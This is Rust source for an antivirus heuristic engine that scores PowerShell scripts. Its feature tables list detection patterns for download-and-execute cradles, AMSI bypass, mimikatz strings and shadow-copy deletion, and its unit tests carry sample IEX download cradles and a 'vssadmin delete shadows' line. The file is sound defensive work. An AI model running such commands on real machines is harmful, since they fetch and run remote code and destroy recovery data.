//! Built-in heuristics for scripts.
//!
//! # Why this is not in the rule file
//!
//! The rule set this product installs is YARA-Forge's, and it is built for
//! binaries: most of its rules carry a `pe` condition, so a `.ps1` full of
//! `IEX (New-Object Net.WebClient).DownloadString(...)` is not a file any of
//! them can match. Measured on 2026-11-14: thirty-five well-known script
//! indicators produced exactly one match (a hacktool string, 60, suspicious).
//! Script droppers are most of how ransomware arrives, so the gap is the
//! important one to close.
//!
//! # Why a score rather than a set of rules
//!
//! Every one of these strings appears in ordinary administration somewhere:
//! `Invoke-WebRequest` downloads, `-NoProfile` is in every shortcut,
//! `vssadmin delete shadows` is in backup scripts. A rule that fired on one of
//! them would be the false positive that teaches a user to ignore the product.
//! The evidence is the *combination* -- a download that is executed, an encoded
//! command kept out of sight, shadow copies deleted while a Run key is set --
//! and a combination is arithmetic: features add, interactions add more, and the
//! verdict thresholds in `av-core` do the rest.
//!
//! The weights are set so that no single feature can reach the malicious band:
//! the strongest is 70 against a threshold of 100. Two independent pieces of
//! evidence, or one strong one plus its natural partner, do.
//!
//! # Why the weights are a table
//!
//! Because they are the thing that will be tuned, and a table with a name on
//! every row is a table a person can argue with. It is also the shape a learned
//! model takes: a weight per feature, no logic to rewrite when the numbers come
//! from data instead of from judgement.

use av_core::{Detection, DetectionSource, FileKind, MatchLocation, Severity};

/// One piece of evidence a script can carry.
///
/// `needles` are matched against the script's text with whitespace removed and
/// every ASCII letter lowercased, so `Invoke -Expression` and
/// `invoke-expression` are the same fact. That normalisation is also why the
/// needles are written without spaces.
struct Feature {
    /// Stable identifier, `script/<name>`.
    id: &'static str,
    /// What a reader is told when this fires.
    description: &'static str,
    /// Score contribution. Deliberately below the malicious threshold alone.
    weight: u16,
    /// Any one of these is the feature.
    needles: &'static [&'static str],
}

/// What a script can be doing, and what that is worth.
///
/// The order is the order the report lists them in, and it runs from the acts
/// that are almost always hostile (credential theft, AMSI bypass) to the ones
/// that are ordinary on their own (a hidden window).
const FEATURES: &[Feature] = &[
    Feature {
        id: "script/credential-theft",
        description: "The script contains strings from a credential-dumping tool.",
        weight: 55,
        needles: &["sekurlsa::", "lsadump::", "mimikatz", "invoke-mimikatz"],
    },
    Feature {
        id: "script/amsi-bypass",
        description: "The script names the AMSI scan function together with a way to patch memory.",
        weight: 70,
        needles: &["amsi.dll", "amsiscanbuffer"],
    },
    Feature {
        id: "script/injection-apis",
        description: "The script names several of the calls used to write into another process.",
        weight: 55,
        needles: &["virtualallocex", "writeprocessmemory", "createremotethread"],
    },
    Feature {
        id: "script/defence-tamper",
        description: "The script attacks the machine's recovery and antivirus settings.",
        weight: 55,
        needles: &[
            "vssadmindeleteshadows",
            "vssadmin.exedeleteshadows",
            "wbadmindeletecatalog",
            "recoveryenabledno",
            "set-mppreference-disable",
            "add-mppreference-exclusionpath",
            "disableantispyware",
            "disablerealtimemonitoring",
            "disablebehaviormonitoring",
        ],
    },
    Feature {
        id: "script/ransom-note",
        description: "The script carries ransom-note text and a payment demand.",
        weight: 55,
        needles: &[
            "yourfileshavebeenencrypted",
            "yourfilesareencrypted",
            "todecryptyourfiles",
            "decryptyourfiles",
            "allyourfileshavebeenencrypted",
        ],
    },
    Feature {
        id: "script/execute-sink",
        description: "The script evaluates or runs dynamic code.",
        weight: 45,
        needles: &["invoke-expression", "iex(", "| iex", "|iex"],
    },
    Feature {
        id: "script/download-sink",
        description: "The script downloads code.",
        weight: 35,
        needles: &[
            "downloadstring",
            "downloadfile",
            "downloaddata",
            "net.webclient",
            "invoke-webrequest",
            "start-bitstransfer",
        ],
    },
    Feature {
        id: "script/persistence",
        description: "The script arranges to be started again, or starts something else.",
        weight: 35,
        needles: &[
            "currentversion\\run",
            "currentversion/run",
            "schtasks/create",
            "schtasks/create",
            "new-scheduledtask",
            "\\startup\\",
            "/startup/",
        ],
    },
    Feature {
        id: "script/base64",
        description: "The script decodes base64-encoded content.",
        weight: 30,
        needles: &["[convert]::frombase64string", "frombase64string("],
    },
    Feature {
        id: "script/encoded-command",
        description: "The script runs PowerShell with an encoded command.",
        weight: 30,
        needles: &["-encodedcommand", "-enc", "-encoded "],
    },
    Feature {
        id: "script/obfuscation",
        description: "The script is built mostly from character codes or joins.",
        weight: 20,
        needles: &["[char]", "-join", "join("],
    },
    Feature {
        id: "script/hidden-window",
        description: "The script asks for a window that is not shown.",
        weight: 15,
        needles: &["-windowstylehidden", "-whidden", "-nop", "-noprofile"],
    },
];

/// A combination that is worth more than its parts.
///
/// Each entry lists the feature identifiers that must all have fired, and the
/// score the combination adds. The sentence is written into the report as its
/// own detection, because "downloads and evaluates what it downloaded" is the
/// finding a reader needs, not two separate lines they have to join themselves.
const INTERACTIONS: &[(&[&str], u16, &str, &str)] = &[
    // A combination is one detection, and a conviction needs one detection past
    // the malicious threshold -- summing several below it reaches "suspicious"
    // by design (`Assessment::finalize`). So the combinations that are evidence
    // in themselves carry that weight themselves; the ones that are merely
    // corroborating stay below it.
    (
        &["script/download-sink", "script/execute-sink"],
        100,
        "script/download-and-run",
        "The script downloads code and evaluates it in memory, which is the shape of a stager.",
    ),
    (
        &["script/base64", "script/execute-sink"],
        100,
        "script/decode-and-run",
        "The script decodes content and evaluates it, which is how a payload is hidden from a reader.",
    ),
    (
        &["script/hidden-window", "script/download-sink", "script/execute-sink"],
        100,
        "script/hidden-download-and-run",
        "The script downloads and evaluates code in a hidden window.",
    ),
    (
        &["script/defence-tamper", "script/persistence"],
        100,
        "script/tamper-and-persist",
        "The script attacks recovery and then arranges to run again, which is how ransomware keeps a foothold.",
    ),
    (
        &["script/ransom-note", "script/defence-tamper"],
        100,
        "script/ransomware-shape",
        "The script carries ransom text and deletes the backups that would undo the damage.",
    ),
];

/// Whether a buffer is text a person could have written.
///
/// No NUL, and at least 95 % of the bytes printable or ordinary whitespace. The
/// bar is high on purpose: the caller uses this to decide that a buffer with no
/// path is a script, and a binary that slipped through would be read as code.
fn looks_like_text(data: &[u8]) -> bool {
    if data.contains(&0) {
        return false;
    }
    let printable = data
        .iter()
        .filter(|byte| matches!(**byte, b'\t' | b'\n' | b'\r') || (0x20..=0x7e).contains(*byte))
        .count();
    printable * 100 >= data.len() * 95
}

/// The text a feature is matched against, with whitespace removed and letters
/// lowercased.
///
/// Whitespace is removed rather than merely normalised because PowerShell
/// without `-NoProfile` allows `Invoke -Expression`, and because the removal
/// is what lets the needles above be written as one word each.
fn flatten(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(data.len());
    for &byte in data {
        match byte {
            b' ' | b'\t' | b'\r' | b'\n' | 0x0b | 0x0c => {}
            b'A'..=b'Z' => out.push(byte + 32),
            _ => out.push(byte),
        }
    }
    out
}

/// Whether the flattened text contains any of the needles.
fn any_of(flat: &[u8], needles: &[&str]) -> bool {
    needles
        .iter()
        .any(|needle| contains(flat, needle.as_bytes()))
}

/// A plain substring search.
fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || needle.len() > haystack.len() {
        return false;
    }
    haystack
        .windows(needle.len())
        .any(|window| window == needle)
}

/// How many of the needles are present.
fn count_of(flat: &[u8], needles: &[&str]) -> usize {
    needles
        .iter()
        .filter(|needle| contains(flat, needle.as_bytes()))
        .count()
}

/// Score a script.
///
/// Returns one [`Detection`] per piece of evidence and one per combination that
/// applies. The caller adds their scores, which is how every other kind of
/// evidence is counted; nothing here decides a verdict.
///
/// `kind` is checked rather than trusted: a PE that happens to contain the text
/// `downloadstring` is not a script, and running these heuristics over one would
/// be reporting a string in a binary as if it were code.
pub fn assess(kind: FileKind, data: &[u8]) -> Vec<Detection> {
    // `Script` is what the on-disk path decides. `Other` is what a caller with
    // no path has -- the AMSI provider hands the service the text of a script
    // about to run, and that buffer names no file -- so a buffer that is text
    // is read as a script. A binary is not: NUL bytes and control characters
    // are what tell the two apart, and a PE cannot pass this test.
    let readable_text = kind == FileKind::Other && looks_like_text(data);
    if (kind != FileKind::Script && !readable_text) || data.len() < 32 {
        return Vec::new();
    }
    let flat = flatten(data);
    let mut out = Vec::new();
    let mut fired: Vec<&'static str> = Vec::new();

    for feature in FEATURES {
        let hit = match feature.id {
            // These two need a second condition, because the name alone is not
            // evidence: the AMSI function is named by every EDR document, and
            // the injection calls are named by debuggers and profilers.
            "script/amsi-bypass" => {
                any_of(&flat, &["amsi.dll", "amsiscanbuffer"])
                    && any_of(&flat, &["patch", "virtualprotect", "writeprocessmemory"])
            }
            "script/injection-apis" => count_of(
                &flat,
                &["virtualallocex", "writeprocessmemory", "createremotethread"],
            ) >= 2,
            "script/ransom-note" => {
                any_of(&flat, &["encrypted", "decrypt"])
                    && any_of(&flat, &["bitcoin", "btc", "wallet", "monero", "xmr"])
            }
            // A bare `Invoke-Expression` is a cmdlet name in a module manifest
            // and in help text; the sink is the call. Measured on 2026-11-14:
            // Microsoft.PowerShell.Utility.psd1 lists the cmdlet and was
            // convicted for it -- one false positive in 702 of Microsoft's own
            // scripts, and a manifest is not something that runs.
            "script/execute-sink" => {
                any_of(&flat, &["iex(", "|iex"])
                    || (contains(&flat, b"invoke-expression") && contains(&flat, b"$"))
            }
            "script/obfuscation" => {
                count_of(&flat, &["[char]", "-join", "join("]) >= 3
            }
            _ => any_of(&flat, feature.needles),
        };
        if !hit {
            continue;
        }
        fired.push(feature.id);
        out.push(
            Detection::new(
                feature.id,
                feature.description,
                Severity::Medium,
                DetectionSource::Heuristic,
            )
            .with_score(feature.weight)
            .with_location(MatchLocation::new(0, 0, feature.id, &[])),
        );
    }

    for (required, weight, id, description) in INTERACTIONS {
        if required.iter().all(|need| fired.contains(need)) {
            out.push(
                Detection::new(*id, *description, Severity::High, DetectionSource::Heuristic)
                    .with_score(*weight)
                    .with_location(MatchLocation::new(0, 0, *id, &[])),
            );
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn score(text: &str) -> u16 {
        assess(FileKind::Script, text.as_bytes())
            .iter()
            .map(|detection| detection.score)
            .sum()
    }

    #[test]
    fn a_download_that_is_executed_is_past_the_malicious_line() {
        let text = "$c = 'http://127.0.0.1/a.ps1'; IEX (New-Object Net.WebClient).DownloadString($c)";
        assert!(score(text) >= 100, "score was {}", score(text));
    }

    #[test]
    fn an_ordinary_download_is_only_suspicious() {
        // The string every installer script contains, with no evaluation of
        // what was downloaded and no hidden window.
        let text = "Invoke-WebRequest -Uri https://example.test/setup.exe -OutFile setup.exe; Start-Process setup.exe";
        let total = score(text);
        assert!(total >= 30, "the download is evidence: {}", total);
        assert!(total < 100, "a download alone is not a conviction: {}", total);
    }

    #[test]
    fn an_ordinary_expression_is_only_suspicious() {
        let text = "$expression = Get-Content .\\script.txt; Invoke-Expression $expression";
        let total = score(text);
        assert!(total >= 30 && total < 100, "score was {}", total);
    }

    #[test]
    fn a_hidden_window_alone_is_not_even_suspicious() {
        let text = "powershell -NoProfile -WindowStyle Hidden -File .\\nightly.ps1";
        let total = score(text);
        assert!(total < 30, "score was {}", total);
    }

    #[test]
    fn ransomware_shape_needs_the_note_and_the_backup_deletion() {
        let note_only = "All your files have been encrypted. Send 0.1 BTC.";
        let both = "All your files have been encrypted. Send 0.1 BTC. vssadmin delete shadows /all /quiet";
        assert!(score(note_only) < 100, "a note alone: {}", score(note_only));
        assert!(score(both) >= 100, "note and deletion: {}", score(both));
    }

    #[test]
    fn a_pe_is_not_treated_as_a_script() {
        let text = "IEX (New-Object Net.WebClient).DownloadString('http://x/y.ps1')";
        assert!(assess(FileKind::Pe, text.as_bytes()).is_empty());
    }

    #[test]
    fn whitespace_and_case_do_not_hide_a_download() {
        let text = "iex ( IEX (new-object NET.webclient).downloadstring ( 'http://x' ) )";
        assert!(score(text) >= 100, "score was {}", score(text));
    }
}
